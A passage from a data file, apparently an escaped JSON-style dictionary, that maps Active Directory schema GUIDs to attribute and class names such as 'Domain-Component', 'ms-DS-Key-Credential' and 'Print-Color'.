""ms-DS-Byte-Array"",\n    ""db77be4a-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-AllowAnonymousSubscription"",\n    ""281416d2-1968-11d0-a28f-00aa003049e2"": ""Print-Collate"",\n    ""0f6a17dc-53e5-4be8-9442-8f3ce2f9012a"": ""MemberNisNetgroup"",\n    ""2e899b04-2834-11d3-91d4-0000f87a57d4"": ""ACS-Resource-Limits"",\n    ""b82ac26b-c6db-4098-92c6-49c18a3336e1"": ""ms-WMI-UnknownRangeParam"",\n    ""19195a55-6da0-11d0-afd3-00c04fd930c9"": ""Domain-Component"",\n    ""69cab008-cdd4-4bc9-bab8-0ff37efe1b20"": ""ms-DS-Cached-Membership"",\n    ""e0c6baae-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Alias"",\n    ""281416d3-1968-11d0-a28f-00aa003049e2"": ""Print-Color"",\n    ""a8032e74-30ef-4ff5-affc-0fc217783fec"": ""NisNetgroupTriple"",\n    ""11f95545-d712-4c50-b847-d2781537c633"": ""ms-DS-Shadow-Principal-Container"",\n    ""b000ea7b-a086-11d0-afdd-00c04fd930c9"": ""Domain-Cross-Ref"",\n    ""3566bf1f-beee-4dcb-8abe-ef89fcfec6c1"": ""ms-DS-Cached-Membership-Time-Stamp"",\n    ""e9098084-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Size"",\n    ""281416cc-1968-11d0-a28f-00aa003049e2"": ""Print-Duplex-Supported"",\n    ""ff2daebf-f463-495a-8405-3e483641eaa2"": ""IpServicePort"",\n    ""7f561289-5301-11d1-a9c5-0000f80367c1"": ""ACS-Subnet"",\n    ""05630000-3927-4ede-bf27-ca91f275c26f"": ""ms-WMI-WMIGPO"",\n    ""963d2734-48be-11d1-a9c3-0000f80367c1"": ""Domain-ID"",\n    ""23773dc2-b63a-11d2-90e1-00c04fd91ab1"": ""MS-DS-Consistency-Guid"",\n    ""ede14754-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-CreationDate"",\n    ""281416ca-1968-11d0-a28f-00aa003049e2"": ""Print-End-Time"",\n    ""cd96ec0b-1ed6-43b4-b26b-f170b645883f"": ""IpServiceProtocol"",\n    ""770f4cb3-1643-469c-b766-edd77aa75e14"": ""ms-DS-Shadow-Principal"",\n    ""7f561278-5301-11d1-a9c5-0000f80367c1"": ""Domain-Identifier"",\n    ""178b7bc2-b63a-11d2-90e1-00c04fd91ab1"": ""MS-DS-Consistency-Child-Count"",\n    ""f2b6abca-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-LastBackupDate"",\n    ""281416cb-1968-11d0-a28f-00aa003049e2"": ""Print-Form-Name"",\n    ""ebf5c6eb-0e2d-4415-9670-1081993b4211"": ""IpProtocolNumber"",\n    ""3e74f60f-3e73-11d1-a9c0-0000f80367c1"": ""Address-Book-Container"",\n    ""9a0dc344-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Configuration"",\n    ""c294f84b-2fad-4b71-be4c-9fc5701f60ba"": ""ms-DS-Key-Id"",\n    ""bf96795d-0de6-11d0-a285-00aa003049e2"": ""Domain-Policy-Object"",\n    ""c5e60132-1480-11d3-91c1-0000f87a57d4"": ""MS-DS-Creator-SID"",\n    ""f6d6dd88-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-LastDiagnosticDate"",\n    ""ba305f6d-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Keep-Printed-Jobs"",\n    ""966825f5-01d9-4a5c-a011-d15ae84efa55"": ""OncRpcNumber"",\n    ""a12e0e9f-dedb-4f31-8f21-1311b958182f"": ""ms-DS-Key-Material"",\n    ""80a67e2a-9f22-11d0-afdd-00c04fd930c9"": ""Domain-Policy-Reference"",\n    ""234fcbd8-fb52-4908-a328-fd9f6e58e403"": ""ms-DS-Date-Time"",\n    ""fbcda2ea-ccee-11d2-9993-0000f87a57d4"": ""MS-SQL-Applications"",\n    ""281416d6-1968-11d0-a28f-00aa003049e2"": ""Print-Language"",\n    ""de8bb721-85dc-4fde-b687-9657688e667e"": ""IpHostNumber"",\n    ""5fd4250a-1262-11d0-a060-00aa006c33ed"": ""Address-Template"",\n    ""876d6817-35cc-436c-acea-5ef7174dd9be"": ""MSMQ-Custom-Recipient"",\n    ""de71b44c-29ba-4597-9eca-c3348ace1917"": ""ms-DS-Key-Usage"",\n    ""bf96795e-0de6-11d0-a285-00aa003049e2"": ""Domain-Replica"",\n    ""6818f726-674b-441b-8a3a-f40596374cea"": ""ms-DS-Default-Quota"",\n    ""01e9a98a-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-Keywords"",\n    ""ba305f7a-47e3-11d0-a1a6-00c04fd930c9"": ""Print-MAC-Address"",\n    ""4e3854f4-3087-42a4-a813-bb0c528958d3"": ""IpNetworkNumber"",\n    ""bd61253b-9401-4139-a693-356fc400f3ea"": ""ms-DS-Key-Principal"",\n    ""80a67e29-9f22-11d0-afdd-00c04fd930c9"": ""Domain-Wide-Policy"",\n    ""a9b38cb6-189a-4def-8a70-0fcfa158148e"": ""ms-DS-Deleted-Object-Lifetime"",\n    ""c1676858-d34b-11d2-999a-0000f87a57d4"": ""MS-SQL-Publisher"",\n    ""281416d1-1968-11d0-a28f-00aa003049e2"": ""Print-Max-Copies"",\n    ""6ff64fcd-462e-4f62-b44a-9a5347659eb9"": ""IpNetmaskNumber"",\n    ""3fdfee4f-47f4-11d1-a9c3-0000f80367c1"": ""Application-Entity"",\n    ""9a0dc345-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Enterprise-Settings"",\n    ""642c1129-3899-4721-8e21-4839e3988ce5"": ""ms-DS-Device-DN"",\n    ""1a1aa5b5-262e-4df6-af04-2cf6b0d80048"": ""drink"",\n    ""2143acca-eead-4d29-b591-85fa49ce9173"": ""ms-DS-DnsRootAlias"",\n    ""c3bb7054-d34b-11d2-999a-0000f87a57d4"": ""MS-SQL-AllowKnownPullSubscription"",\n    ""281416cf-1968-11d0-a28f-00aa003049e2"": ""Print-Max-Resolution-Supported"",\n    ""e6a522dd-9770-43e1-89de-1de5044328f7"": ""MacAddress"",\n    ""dffbd720-0872-402e-9940-fcd78db049ba"": ""ms-DS-Computer-SID"",\n    ""281416c5-1968-11d0-a28f-00aa003049e2"": ""Driver-Name"",\n    ""5706aeaf-b940-4fb2-bcfc-5268683ad9fe"": ""ms-DS-Enabled-Feature"",\n    ""c4186b6e-d34b-11d2-999a-0000f87a57d4"": ""MS-SQL-AllowImmediateUpdatingSubscription"",\n    ""ba305f6f-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Max-X-Extent"",\n    ""d72a0750-8c7c-416e-8714-e65f11e908be"": ""BootParameter"",\n    ""5fd4250b-1262-11d0-a060-00aa006c33ed"": ""Application-Process"",\n    ""46b27aac-aafa-4ffb-b773-e5bf621ee87b"": ""MSMQ-Group"",\n    ""b6e5e988-e5e4-4c86-a2ae-0dacb970a0e1"": ""ms-DS-Custom-Key-Information"",\n    ""ba305f6e-47e3-11d0-a1a6-00c04fd930c9"": ""Driver-Version"",\n    ""ce5b01bc-17c6-44b8-9dc1-a9668b00901b"": ""ms-DS-Enabled-Feature-BL"",\n    ""c458ca80-d34b-11d2-999a-0000f87a57d4"": ""MS-SQL-AllowQueuedUpdatingSubscription"",\n    ""ba305f70-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Max-Y-Extent"",\n    ""e3f3cb4e-0f20-42eb-9703-d2ff26e52667"": ""BootFile"",\n    ""649ac98d-9b9a-4d41-af6b-f616f2a62e4a"": ""ms-DS-Key-Approximate-Last-Logon-Time-Stamp"",\n    ""d167aa4b-8b08-11d2-9939-0000f87a57d4"": ""DS-Core-Propagation-Data"",\n    ""e1e9bad7-c6dd-4101-a843-794cec85b038"": ""ms-DS-Entry-Time-To-Die"",\n    ""c49b8be8-d34b-11d2-999a-0000f87a57d4"": ""MS-SQL-AllowSnapshotFilesFTPDownloading"",\n    ""3bcbfcf5-4d3d-11d0-a1a6-00c04fd930c9"": ""Print-Media-Ready"",\n    ""969d3c79-0e9a-4d95-b0ac-bdde7ff8f3a1"": ""NisMapName"",\n    ""f780acc1-56f0-11d1-a9c6-0000f80367c1"": ""Application-Settings"",\n    ""50776997-3c3d-11d2-90cc-00c04fd91ab1"": ""MSMQ-Migrated-User"",\n    ""f0f8ff86-1191-11d0-a060-00aa006c33ed"": ""DS-Heuristics"",\n    ""9d054a5a-d187-46c1-9d85-42dfc44a56dd"": ""ms-DS-ExecuteScriptPassword"",\n    ""c4e311fc-d34b-11d2-999a-0000f87a57d4"": ""MS-SQL-ThirdParty"",\n    ""244b296f-5abd-11d0-afd2-00c04fd930c9"": ""Print-Media-Supported"",\n    ""4a95216e-fcc0-402e-b57f-5971626148a9"": ""NisMapEntry"",\n    ""ee1f5543-7c2e-476a-8b3f-e11f4af6c498"": ""ms-DS-Key-Credential"",\n    ""ee8d0ae0-6f91-11d2-9905-0000f87a57d4"": ""DS-UI-Admin-Maximum"",\n    ""b92fd528-38ac-40d4-818d-0433380837c1"": ""ms-DS-External-Key"",\n    ""4cc4601e-7201-4141-abc8-3e529ae88863"": ""ms-TAPI-Conference-Blob"",\n    ""ba305f74-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Memory"",\n    ""27eebfa2-fbeb-4f8e-aad6-c50247994291"": ""msSFU-30-Search-Container"",\n    ""19195a5c-6da0-11d0-afd3-00c04fd930c9"": ""Application-Site-Settings"",\n    ""9a0dc343-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Queue"",\n    ""938ad788-225f-4eee-93b9-ad24a159e1db"": ""ms-DS-Key-Credential-Link-BL"",\n    ""f6ea0a94-6f91-11d2-9905-0000f87a57d4"": ""DS-UI-Admin-Notification"",\n    ""604877cd-9cdb-47c7-b03d-3daadb044910"": ""ms-DS-External-Store"",\n    ""efd7d7f7-178e-4767-87fa-f8a16b840544"": ""ms-TAPI-Ip-Address"",\n    ""ba305f71-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Min-X-Extent"",\n    ""32ecd698-ce9e-4894-a134-7ad76b082e83"": ""msSFU-30-Key-Attributes"",\n    ""bf967aba-0de6-11d0-a285-00aa003049e2"": ""User"",\n    ""fcca766a-6f91-11d2-9905-0000f87a57d4"": ""DS-UI-Shell-Maximum"",\n    ""9b88bda8-dd82-4998-a91d-5f2d2baf1927"": ""ms-DS-Optional-Feature-GUID"",\n    ""89c1ebcf-7a5f-41fd-99ca-c900b32299ab"": ""ms-TAPI-Protocol-Id"",\n    ""ba305f72-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Min-Y-Extent"",\n    ""a2e11a42-e781-4ca1-a7fa-ec307f62b6a1"": ""msSFU-30-Field-Separator"",\n    ""ddc790ac-af4d-442a-8f0f-a1d4caa7dd92"": ""Application-Version"",\n    ""9a0dc347-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Settings"",\n    ""167757bc-47f3-11d1-a9c3-0000f80367c1"": ""DSA-Signature"",\n    ""fb00dcdf-ac37-483a-9c12-ac53a6603033"": ""ms-DS-Filter-Containers"",\n    ""70a4e7ea-b3b9-4643-8918-e6dd2471bfd4"": ""ms-TAPI-Unique-Identifier"",\n    ""ba305f79-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Network-Address"",\n    ""95b2aef0-27e4-4cb9-880a-a2d9a9ea23b8"": ""msSFU-30-Intra-Field-Separator"",\n    ""5df2b673-6d41-4774-b3e8-d52e8ee9ff99"": ""ms-DS-Device"",\n    ""52458021-ca6a-11d0-afff-0000f80367c1"": ""Dynamic-LDAP-Server"",\n    ""11e9a5bc-4517-4049-af9c-51554fb0fc09"": ""ms-DS-Has-Instantiated-NCs"",\n    ""6366c0c1-6972-4e66-b3a5-1d52ad0c0547"": ""ms-WMI-Author"",\n    ""ba305f6a-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Notify"",\n    ""ef9a2df0-2e57-48c8-8950-0cc674004733"": ""msSFU-30-Search-Attributes"",\n    ""9a0dc346-c100-11d1-bbc5-0080c76670c0"": ""MSMQ-Site-Link"",\n    ""5b47d60f-6090-40b2-9f37-2a4de88f3063"": ""ms-DS-Key-Credential-Link"",\n    ""bf967961-0de6-11d0-a285-00aa003049e2"": ""E-mail-Addresses"",\n    ""6f17e347-a842-4498-b8b3-15e007da4fed"": ""ms-DS-Has-Domain-NCs"",\n    ""f9cdf7a0-ec44-4937-a79b-cd91522b3aa8"": ""ms-WMI-ChangeDate"",\n    ""3bcbfcf4-4d3d-11d0-a1a6-00c04fd930c9"": ""Print-Number-Up"",\n    ""e167b0b6-4045-4433-ac35-53f972d45cba"": ""msSFU-30-Result-Attributes"",\n    ""bf967a81-0de6-11d0-a285-00aa003049e2"": ""Builtin-Domain"",\n    ""8e4eb2ec-4712-11d0-a1a0-00c04fd930c9"": ""EFSPolicy"",\n    ""ae2de0e2-59d7-4d47-8d47-ed4dfe4357ad"": ""ms-DS-Has-Master-NCs"",\n    ""90c1925f-4a24-4b07-b202-be32eb3c8b74"": ""ms-WMI-Class"",\n    ""281416d0-1968-11d0-a28f-00aa003049e2"": ""Print-Orientations-Supported"",\n    ""b7b16e01-024f-4e23-ad0d-71f1a406b684"": ""msSFU-30-Map-Filter"",\n    ""19195a60-6da0-11d0-afd3-00c04fd930c9"": ""NTDS-Connection"",\n    ""f2699093-f25a-4220-9deb-03df4cc4a9c5"": ""Dns-Zone-Scope-Container"",\n    ""bf967962-0de6-11d0-a285-00aa003049e2"": ""Employee-ID"",\n    ""80641043-15a2-40e1-92a2-8ca866f70776"": ""ms-DS-Host-Service-Account"",\n    ""2b9c0ebc-c272-45cb-99d2-4d0e691632e0"": ""ms-WMI-ClassDefinition"",\n    ""ba305f69-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Owner"",\n    ""4cc908a2-9e18-410e-8459-f17cc422020a"": ""msSFU-30-Master-Server-Name"",\n    ""7d6c0e9d-7e20-11d0-afd6-00c04fd930c9"": ""Category-Registration"",\n    ""a8df73ef-c5ea-11d1-bbcb-0080c76670c0"": ""Employee-Number"",\n    ""79abe4eb-88f3-48e7-89d6-f4bc7e98c331"": ""ms-DS-Host-Service-Account-BL"",\n    ""748b0a2e-3351-4b3f-b171-2f17414ea779"": ""ms-WMI-CreationDate"",\n    ""19405b97-3cfa-11d1-a9c0-0000f80367c1"": ""Print-Pages-Per-Minute"",\n    ""02625f05-d1ee-4f9f-b366-55266becb95c"": ""msSFU-30-Order-Number"",\n    ""f0f8ffab-1191-11d0-a060-00aa006c33ed"": ""NTDS-DSA"",\n    ""696f8a61-2d3f-40ce-a4b3-e275dfcc49c5"": ""Dns-Zone-Scope"",\n    ""a8df73f0-c5ea-11d1-bbcb-0080c76670c0"": ""Employee-Type"",\n    ""7bc64cea-c04e-4318-b102-3e0729371a65"": ""ms-DS-Integer"",\n    ""50c8673a-8f56-4614-9308-9e1340fb9af3"": ""ms-WMI-Genus"",\n    ""ba305f77-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Rate"",\n    ""16c5d1d3-35c2-4061-a870-a5cefda804f0"": ""msSFU-30-Name"",\n    ""3fdfee50-47f4-11d1-a9c3-0000f80367c1"": ""Certification-Authority"",\n    ""a8df73f2-c5ea-11d1-bbcb-0080c76670c0"": ""Enabled"",\n    ""bc60096a-1b47-4b30-8877-602c93f56532"": ""ms-DS-IntId"",\n    ""9339a803-94b8-47f7-9123-a853b9ff7e45"": ""ms-WMI-ID"",\n    ""ba305f78-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Rate-Unit"",\n    ""20ebf171-c69a-4c31-b29d-dcb837d8912d"": ""msSFU-30-Aliases"",\n    ""85d16ec1-0791-4bc8-8ab3-70980602ff8c"": ""NTDS-DSA-RO"",\n    ""e0fa1e8c-9b45-11d0-afdd-00c04fd930c9"": ""Dns-Node"",\n    ""bf967963-0de6-11d0-a285-00aa003049e2"": ""Enabled-Connection"",\n    ""6fabdcda-8c53-204f-b1a4-9df0c67c1eb4"": ""ms-DS-Is-Possible-Values-Present"",\n    ""1b0c07f8-76dd-4060-a1e1-70084619dc90"": ""ms-WMI-intDefault"",\n    ""281416c6-1968-11d0-a28f-00aa003049e2"": ""Print-Separator-File"",\n    ""37830235-e5e9-46f2-922b-d8d44f03e7ae"": ""msSFU-30-Key-Values"",\n    ""bf967a82-0de6-11d0-a285-00aa003049e2"": ""Class-Registration"",\n    ""3417ab48-df24-4fb1-80b0-0fcb367e25e3"": ""ms-DS-Expire-Passwords-On-Smart-Card-Only-Accounts"",\n    ""2a39c5b3-8960-11d1-aebc-0000f80367c1"": ""Enrollment-Providers"",\n    ""1df5cf33-0fe5-499e-90e1-e94b42718a46"": ""ms-DS-isGC"",\n    ""18e006b9-6445-48e3-9dcf-b5ecfbc4df8e"": ""ms-WMI-intFlags1"",\n    ""ba305f68-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Share-Name"",\n    ""9ee3b2e3-c7f3-45f8-8c9f-1382be4984d2"": ""msSFU-30-Nis-Domain"",\n    ""19195a5f-6da0-11d0-afd3-00c04fd930c9"": ""NTDS-Service"",\n    ""65650576-4699-4fc9-8d18-26e0cd0137a6"": ""ms-DS-Token-Group-Names"",\n    ""d213decc-d81a-4384-aac2-dcfcfd631cf8"": ""Entry-TTL"",\n    ""a8e8aa23-3e67-4af1-9d7a-2f1a1d633ac9"": ""ms-DS-isRODC"",\n    ""075a42c9-c55a-45b1-ac93-eb086b31f610"": ""ms-WMI-intFlags2"",\n    ""ba305f6c-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Spooling"",\n    ""93095ed3-6f30-4bdd-b734-65d569f5f7c9"": ""msSFU-30-Domains"",\n    ""fa06d1f4-7922-4aad-b79c-b2201f54417c"": ""ms-DS-Token-Group-Names-Global-And-Universal"",\n    ""9a7ad947-ca53-11d1-bbd0-0080c76670c0"": ""Extended-Attribute-Info"",\n    ""8ab15858-683e-466d-877f-d640e1f9a611"": ""ms-DS-Last-Known-RDN"",\n    ""f29fa736-de09-4be4-b23a-e734c124bacc"": ""ms-WMI-intFlags3"",\n    ""ba305f73-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Stapling-Supported"",\n    ""084a944b-e150-4bfe-9345-40e1aedaebba"": ""msSFU-30-Yp-Servers"",\n    ""bf967a84-0de6-11d0-a285-00aa003049e2"": ""Class-Store"",\n    ""19195a5d-6da0-11d0-afd3-00c04fd930c9"": ""NTDS-Site-Settings"",\n    ""523fc6c8-9af4-4a02-9cd7-3dea129eeb27"": ""ms-DS-Token-Group-Names-No-GC-Acceptable"",\n    ""bf967966-0de6-11d0-a285-00aa003049e2"": ""Extended-Chars-Allowed"",\n    ""c523e9c0-33b5-4ac8-8923-b57b927f42f6"": ""ms-DS-KeyVersionNumber"",\n    ""bd74a7ac-c493-4c9c-bdfa-5c7b119ca6b2"": ""ms-WMI-intFlags4"",\n    ""281416c9-1968-11d0-a28f-00aa003049e2"": ""Print-Start-Time"",\n    ""04ee6aa6-f83b-469a-bf5a-3c00d3634669"": ""msSFU-30-Max-Gid-Number"",\n    ""9a7ad948-ca53-11d1-bbd0-0080c76670c0"": ""Extended-Class-Info"",\n    ""ad7940f8-e43a-4a42-83bc-d688e59ea605"": ""ms-DS-Logon-Time-Sync-Interval"",\n    ""fb920c2c-f294-4426-8ac1-d24b42aa2bce"": ""ms-WMI-intMax"",\n    ""ba305f6b-47e3-11d0-a1a6-00c04fd930c9"": ""Print-Status"",\n    ""ec998437-d944-4a28-8500-217588adfc75"": ""msSFU-30-Max-Uid-Number"",\n    ""bf967a85-0de6-11d0-a285-00aa003049e2"": ""Com-Connection-Point"",\n    ""2a132586-9373-11d1-aebc-0000f80367c1"": ""NTFRS-Member"",\n    ""bf967ab0-0de6-11d0-a285-00aa003049e2"": ""Security-Principal"",\n    ""bf967972-0de6-11d0-a285-00aa003049e2"": ""Extension-Name"",\n    ""60234769-4819-4615-a1b2-49d2f119acb5"": ""ms-DS-Mastered-By"",\n    ""68c2e3ba-9837-4c70-98e0-f0c33695d023"": ""ms-WMI-intMin"",\n    ""244b296e-5abd-11d0-afd2-00c04fd930c9"": ""Printer-Name"",\n    ""585c9d5e-f599-4f07-9cf9-4373af4b89d3"": ""msSFU-30-NSMAP-Field-Position"",\n    ""7ece040f-9327-4cdc-aad3-037adfe62639"": ""ms-DS-User-Allowed-NTLM-Network-Authentication"",\n    ""d24e2846-1dd9-4bcf-99d7-a6227cc86da7"": ""Extra-Columns"",\n    ""fdd337f5-4999-4fce-b252-8ff9c9b43875"": ""ms-DS-Maximum-Password-Age"",\n    ""6af565f6-a749-4b72-9634-3c5d47e6b4e0"": ""ms-WMI-intValidValues"",\n    ""bf967a01-0de6-11d0-a285-00aa003049e2"": ""Prior-Set-Time"",\n    ""c875d82d-2848-4cec-bb50-3c5486d09d57"": ""msSFU-30-Posix-Member"",\n    ""bf967a86-0de6-11d0-a285-00aa003049e2"": ""Computer"",\n    ""5245803a-ca6a-11d0-afff-0000f80367c1"": ""NTFRS-Replica-Set"",\n    ""278947b9-5222-435e-96b7-1503858c2b48"": ""ms-DS-Service-Allowed-NTLM-Network-Authentication"",\n    ""bf967974-0de6-11d0-a285-00aa003049e2"": ""Facsimile-Telephone-Number"",\n    ""2a74f878-4d9c-49f9-97b3-6767d1cbd9a3"": ""ms-DS-Minimum-Password-Age"",\n    ""f4d8085a-8c5b-4785-959b-dc585566e445"": ""ms-WMI-int8Default"",\n    ""bf967a02-0de6-11d0-a285-00aa003049e2"": ""Prior-Value"",\n    ""7bd76b92-3244-438a-ada6-24f5ea34381e"": ""msSFU-30-Posix-Member-Of"",\n    ""aacd2170-482a-44c6-b66e-42c2f66a285c"": ""ms-DS-Strong-NTLM-Policy"",\n    ""d9e18315-8939-11d1-aebc-0000f80367c1"": ""File-Ext-Priority"",\n    ""b21b3439-4c3a-441c-bb5f-08f20e9b315e"": ""ms-DS-Minimum-Password-Length"",\n    ""e3d8b547-003d-4946-a32b-dc7cedc96b74"": ""ms-WMI-int8Max"",\n    ""281416c7-1968-11d0-a28f-00aa003049e2"": ""Priority"",\n    ""97d2bf65-0466-4852-a25a-ec20f57ee36c"": ""msSFU-30-Netgroup-Host-At-Domain"",\n    ""bf967a87-0de6-11d0-a285-00aa003049e2"": ""Configuration"",\n    ""f780acc2-56f0-11d1-a9c6-0000f80367c1"": ""NTFRS-Settings"",\n    ""bf967976-0de6-11d0-a285-00aa003049e2"": ""Flags"",\n    ""f9c9a57c-3941-438d-bebf-0edaf2aca187"": ""ms-DS-OIDToGroup-Link"",\n    ""ed1489d1-54cc-4066-b368-a00daa2664f1"": ""ms-WMI-int8Min"",\n    ""bf967a03-0de6-11d0-a285-00aa003049e2"": ""Private-Key"",\n    ""a9e84eed-e630-4b67-b4b3-cad2a82d345e"": ""msSFU-30-Netgroup-User-At-Domain"",\n    ""ab6a1156-4dc7-40f5-9180-8e4ce42fe5cd"": ""ms-DS-AuthN-Policy"",\n    ""b7b13117-b82e-11d0-afee-0000f80367c1"": ""Flat-Name"",\n    ""1a3d0d20-5844-4199-ad25-0f5039a76ada"": ""ms-DS-OIDToGroup-Link-BL"",\n    ""103519a9-c002-441b-981a-b0b3e012c803"": ""ms-WMI-int8ValidValues"",\n    ""19405b9a-3cfa-11d1-a9c0-0000f80367c1"": ""Privilege-Attributes"",\n    ""0dea42f5-278d-4157-b4a7-49b59664915b"": ""msSFU-30-Is-Valid-Container"",\n    ""5cb41ecf-0e4c-11d0-a286-00aa003049e2"": ""Connection-Point"",\n    ""2a132588-9373-11d1-aebc-0000f80367c1"": ""NTFRS-Subscriber"",\n    ""b002f407-1340-41eb-bca0-bd7d938e25a9"": ""ms-DS-Source-Anchor"",\n    ""bf967977-0de6-11d0-a285-00aa003049e2"": ""Force-Logoff"",\n    ""fed81bb7-768c-4c2f-9641-2245de34794d"": ""ms-DS-Password-History-Length"",\n    ""6736809f-2064-443e-a145-81262b1f1366"": ""ms-WMI-Mof"",\n    ""19405b98-3cfa-11d1-a9c0-0000f80367c1"": ""Privilege-Display-Name"",\n    ""4503d2a3-3d70-41b8-b077-dff123c15865"": ""msSFU-30-Crypt-Method"",\n    ""5cb41ed0-0e4c-11d0-a286-00aa003049e2"": ""Contact"",\n    ""34f6bdf5-2e79-4c3b-8e14-3d93b75aab89"": ""ms-DS-Object-SOA"",\n    ""3e97891e-8c01-11d0-afda-00c04fd930c9"": ""Foreign-Identifier"",\n    ""db68054b-c9c3-4bf0-b15b-0fb52552a610"": ""ms-DS-Password-Complexity-Enabled"",\n    ""c6c8ace5-7e81-42af-ad72-77412c5941c4"": ""ms-WMI-Name"",\n    ""19405b9b-3cfa-11d1-a9c0-0000f80367c1"": ""Privilege-Holder"",\n    ""e65c30db-316c-4060-a3a0-387b083f09cd"": ""ms-TS-Profile-Path"",\n    ""bf967aa7-0de6-11d0-a285-00aa003049e2"": ""Person"",\n    ""2a132587-9373-11d1-aebc-0000f80367c1"": ""NTFRS-Subscriptions"",\n    ""7bfdcb88-4807-11d1-a9c3-0000f80367c1"": ""Friendly-Names"",\n    ""75ccdd8f-af6c-4487-bb4b-69e4d38a959c"": ""ms-DS-Password-Reversible-Encryption-Enabled"",\n    ""eaba628f-eb8e-4fe9-83fc-693be695559b"": ""ms-WMI-NormalizedClass"",\n    ""19405b99-3cfa-11d1-a9c0-0000f80367c1"": ""Privilege-Value"",\n    ""5d3510f0-c4e7-4122-b91f-a20add90e246"": ""ms-TS-Home-Directory"",\n    ""bf967ab7-0de6-11d0-a285-00aa003049e2"": ""Top"",\n    ""9a7ad949-ca53-11d1-bbd0-0080c76670c0"": ""From-Entry"",\n    ""94f2800c-531f-4aeb-975d-48ac39fd8ca4"": ""ms-DS-Local-Effective-Deletion-Time"",\n    ""27e81485-b1b0-4a8b-bedd-ce19a837e26e"": ""ms-WMI-Parm1"",\n    ""d9e18317-8939-11d1-aebc-0000f80367c1"": ""Product-Code"",\n    ""5f0a24d9-dffa-4cd9-acbf-a0680c03731e"": ""ms-TS-Home-Drive"",\n    ""bf967a8b-0de6-11d0-a285-00aa003049e2"": ""Container"",\n    ""bf967aa3-0de6-11d0-a285-00aa003049e2"": ""Organization"",\n    ""bf967979-0de6-11d0-a285-00aa003049e2"": ""From-Server"",\n    ""4ad6016b-b0d2-4c9b-93b6-5964b17b968c"": ""ms-DS-Local-Effective-Recycle-Time"",\n    ""0003508e-9c42-4a76-a8f4-38bf64bab0de"": ""ms-WMI-Parm2"",\n    ""bf967a05-0de6-11d0-a285-00aa003049e2"": ""Profile-Path"",\n    ""3a0cd464-bc54-40e7-93ae-a646a6ecc4b4"": ""ms-TS-Allow-Logon"",\n    ""bf967aa4-0de6-11d0-a285-00aa003049e2"": ""Organizational-Person"",\n    ""bf967a90-0de6-11d0-a285-00aa003049e2"": ""Sam-Domain"",\n    ""2a132578-9373-11d1-aebc-0000f80367c1"": ""Frs-Computer-Reference"",\n    ""b05bda89-76af-468a-b892-1be55558ecc8"": ""ms-DS-Lockout-Observation-Window"",\n    ""45958fb6-52bd-48ce-9f9f-c2712d9f2bfc"": ""ms-WMI-Parm3"",\n    ""e1aea402-cd5b-11d0-afff-0000f80367c1"": ""Proxied-Object-Name"",\n    ""15177226-8642-468b-8c48-03ddfd004982"": ""ms-TS-Remote-Control"",\n    ""8297931e-86d3-11d0-afda-00c04fd930c9"": ""Control-Access-Right"",\n    ""2a132579-9373-11d1-aebc-0000f80367c1"": ""Frs-Computer-Reference-BL"",\n    ""421f889a-472e-4fe4-8eb9-e1d0bc6071b2"": ""ms-DS-Lockout-Duration"",\n    ""3800d5a3-f1ce-4b82-a59a-1528ea795f59"": ""ms-WMI-Parm4"",\n    ""bf967a06-0de6-11d0-a285-00aa003049e2"": ""Proxy-Addresses"",\n    ""326f7089-53d8-4784-b814-46d8535110d2"": ""ms-TS-Max-Disconnection-Time"",\n    ""a8df74bf-c5ea-11d1-bbcb-0080c76670c0"": ""Organizational-Role"",\n    ""2a13257a-9373-11d1-aebc-0000f80367c1"": ""FRS-Control-Data-Creation"",\n    ""b8c8c35e-4a19-4a95-99d0-69fe4446286f"": ""ms-DS-Lockout-Threshold"",\n    ""ab920883-e7f8-4d72-b4a0-c0449897509d"": ""ms-WMI-PropertyName"",\n    ""5fd424d6-1262-11d0-a060-00aa006c33ed"": ""Proxy-Generation-Enabled"",\n    ""1d960ee2-6464-4e95-a781-e3b5cd5f9588"": ""ms-TS-Max-Connection-Time"",\n    ""bf967a8c-0de6-11d0-a285-00aa003049e2"": ""Country"",\n    ""2a13257b-9373-11d1-aebc-0000f80367c1"": ""FRS-Control-Inbound-Backlog"",\n    ""64c80f48-cdd2-4881-a86d-4e97b6f561fc"": ""ms-DS-PSO-Applies-To"",\n    ""65fff93e-35e3-45a3-85ae-876c6718297f"": ""ms-WMI-Query"",\n    ""bf967a07-0de6-11d0-a285-00aa003049e2"": ""Proxy-Lifetime"",\n    ""ff739e9c-6bb7-460e-b221-e250f3de0f95"": ""ms-TS-Max-Idle-Time"",\n    ""bf967aa5-0de6-11d0-a285-00aa003049e2"": ""Organizational-Unit"",\n    ""2a13257c-9373-11d1-aebc-0000f80367c1"": ""FRS-Control-Outbound-Backlog"",\n    ""5e6cf031-bda8-43c8-aca4-8fee4127005b"": ""ms-DS-PSO-Applied"",\n    ""7d3cfa98-c17b-4254-8bd7-4de9b932a345"": ""ms-WMI-QueryLanguage"",\n    ""80a67e28-9f22-11d0-afdd-00c04fd930c9"": ""Public-Key-Policy"",\n    ""366ed7ca-3e18-4c7f-abae-351a01e4b4f7"": ""ms-TS-Reconnection-Action"",\n    ""167758ca-47f3-11d1-a9c3-0000f80367c1"": ""CRL-Distribution-Point"",\n    ""1be8f171-a9ff-11d0-afe2-00c04fd930c9"": 